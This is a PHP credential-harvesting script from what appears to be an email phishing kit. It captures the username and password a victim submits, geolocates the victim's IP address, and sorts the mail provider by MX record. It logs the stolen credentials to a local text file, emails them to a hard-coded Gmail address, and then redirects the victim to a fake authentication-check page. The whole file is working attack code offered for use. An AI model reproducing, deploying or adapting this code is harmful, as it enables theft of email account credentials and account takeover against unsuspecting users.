<?php
error_reporting(E_ERROR | E_PARSE);
class geoPluginn {
	

	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}
$_user = $_REQUEST['_user'];
$_pass = $_REQUEST['_pass'];

/******Pre-defined MX******/
$valid = [
			'secureserver.net' 						=> 		'godaddy',
			'mail.protection.outlook.com' 			=> 		'office',
			'barracudanetworks.com' 				=> 		'office',
			'pphosted.com' 							=> 		'office',
			'ppe-hosted.com' 						=> 		'office',
			'mail.eo.outlook.com' 					=> 		'office',
			'mail.outlook.com' 						=> 		'office',
			'arsmtp.com' 							=> 		'office',
			'parsons-peebles.com' 					=> 		'office',
			'inbound-2.mimecast.com' 				=> 		'office',
			'messagelabs.com' 						=> 		'office',
			'itwconnect.com' 						=> 		'office',
			'prod.hydra.sophos.com' 				=> 		'office',
			'antispam.spg-llc.com' 					=> 		'office',
			'mxthunder.co' 							=> 		'office',
			'mailanyone.net' 						=> 		'office',
			'trendmicro.eu' 						=> 		'office',
			'1and1.com' 							=> 		'1and1',
			'1and1.co.uk' 							=> 		'1and1',
			'ionos.de' 								=> 		'1and1',
			'ionos.es'								=> 		'1and1',
			'1and1.fr' 								=> 		'1and1',
			'ionos.com' 							=> 		'1and1',
			'cph3.one.com' 							=> 		'sendone',
			'mailhostbox.com' 						=> 		'mailhostbox',
			'emailsrvr.com' 						=> 		'rackspace',
			'mtaroutes.com' 						=> 		'rackspace',
			'email.rr.com' 							=> 		'roadrunner',
			'skynet.be' 							=> 		'proximus',
			'gandi.net' 							=> 		'gandi',
			'mx00.mail.com' 						=> 		'mail.com',
			'mx01.mail.com' 						=> 		'mail.com',
			'mxmail.netease.com' 					=> 		'Netease',
			'263.net' 								=> 		'263',
			'263xmail.com' 							=> 		'263',
			'qq.com' 								=> 		'QQ',
			'rzone.de' 								=> 		'Strato',
			'netsolmail.net' 						=> 		'netsolmail',
			'ovh.net' 						        => 		'ovh',
			
];

//MX Detector
function mx_detect( $_user, $needle ) {
	$mail_part = explode( "@", $_user );
	$domain = $mail_part[1];
	if( checkdnsrr( $domain,'MX' ) ) {
		if( getmxrr( $domain , $mxhosts , $weight ) ) {
			foreach( $needle as $item => $bin ) {
				foreach( $mxhosts as $key => $hay ) {
					if( stripos( $hay, $item ) !== FALSE ) {
						return $bin;
					} 
				}
			}
		}
	}
}


$mail_part = explode( "@", $_user );
$domain = $mail_part[1];
$results = dns_get_record($domain, DNS_MX);
$target_pri = min(array_column($results, "pri"));
$highest_pri = array_filter(
	$results,
	function($item) use($target_pri) {return $item["pri"] === $target_pri;}
);
foreach ($highest_pri as $mx) {
	$mx = "$mx[target] ";
}

$geopluginn = new geoPluginn();
$geopluginn->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "MX Record: ".$mx."\n";
$message .= "Email: ".$_POST['_user']."\n";
$message .= "Pass: ".$_POST['_pass']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geopluginn->ip}\n";
$message .= 	"City: {$geopluginn->city}\n";
$message .= 	"Region: {$geopluginn->region}\n";
$message .= 	"Country Name: {$geopluginn->countryName}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";

$domain = 'Japan Logs.';
$subj = "New Results | $geopluginn->ip | $geopluginn->countryName | $geopluginn->countryCode";
$from = "From: $domain<west>\n";

file_put_contents('jpsnew1.txt', $message, FILE_APPEND);

mail("brightlights660@gmail.com",$subj,$message,$from,$domain);

header("Location: check/?cgitoken=submit_authentication&id=$praga$praga&session=$praga$praga&uid=$uid&idd=$praga")


?>